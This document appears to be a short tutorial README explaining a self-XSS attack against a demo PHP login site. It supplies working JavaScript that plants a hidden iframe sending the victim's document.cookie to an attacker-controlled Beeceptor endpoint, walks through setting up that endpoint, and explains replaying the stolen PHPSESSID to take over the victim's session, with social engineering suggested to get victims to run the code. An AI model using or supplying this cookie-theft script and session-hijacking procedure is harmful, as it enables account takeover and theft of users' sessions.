Self XSS is a specific XSS attack that is much simpler than you might think
We know that an XSS is basically just injecting some clint-side code as HTML or Javascript to our target to make this code executed in his side
Self-XSS is a social-engeneering attack where this code will be directly executed by the target itself, so yes it's simple
We have some (here javascript) code, for example :
```js
alert("Of mice and men is the best metalcore band");
```
Or :
```js
alert(session.cookie);
```
And we want this code to be executed on the target's side but we have no way to do it by attacking the site ourselves or attacking the target itself, so we'll use this technique
In "files/" folder in this "self-xss" folder there is the code for our example but basically it's just a website where we can "log in" where we enter an ID and a password and these will be stored in $_SESSION[]
So we want to get the cookie of the target
Guess what we will do now ?
Extremely simple, we will manage to make our malicious code be executed in the site where the victim is connected
There are whole lot of ways doing this like for example execute a program on the victim's computer making it connecting to this site and executing this code
Or simply with social engeneering
So basically let's make a code to get our cookie
```js
var ifrm = document.createElement("iframe");
ifrm.setAttribute("src", "<beecepetor address>?cookie="+document.cookie);
ifrm.style.width = "640px";
ifrm.style.height = "480px";
ifrm.frameBorder = "0" 
ifrm.seamless = "seamless"
ifrm.hidden = true
document.body.appendChild(ifrm);
```
Beeceptor is website that creates HTTP server : https://beeceptor.com/
Connect to this website, create a nickname then you'll see your address, it's something like : `https://aaaaaa.free.beeceptor.com` so replace <beeceptor address> with this
Or of course you can use any other website but basically this script will create a hidden iframe, will connect to this website sending via GET the document.cookie
So once this JS code is executed in the target's console you will receive in the website the cookie
And now you can connect to the website replacing your PHPSESSID cookie with the cookie you get
So you may recieve : `/?cookie=PHPSESSID=5rz6g5zr65gzr5grzg65zr`
Now you can replace your PHPSESSID cookie with this `5rz6g5zr65gzr5grzg65zr` you recieved
And now you are in the target's Session !
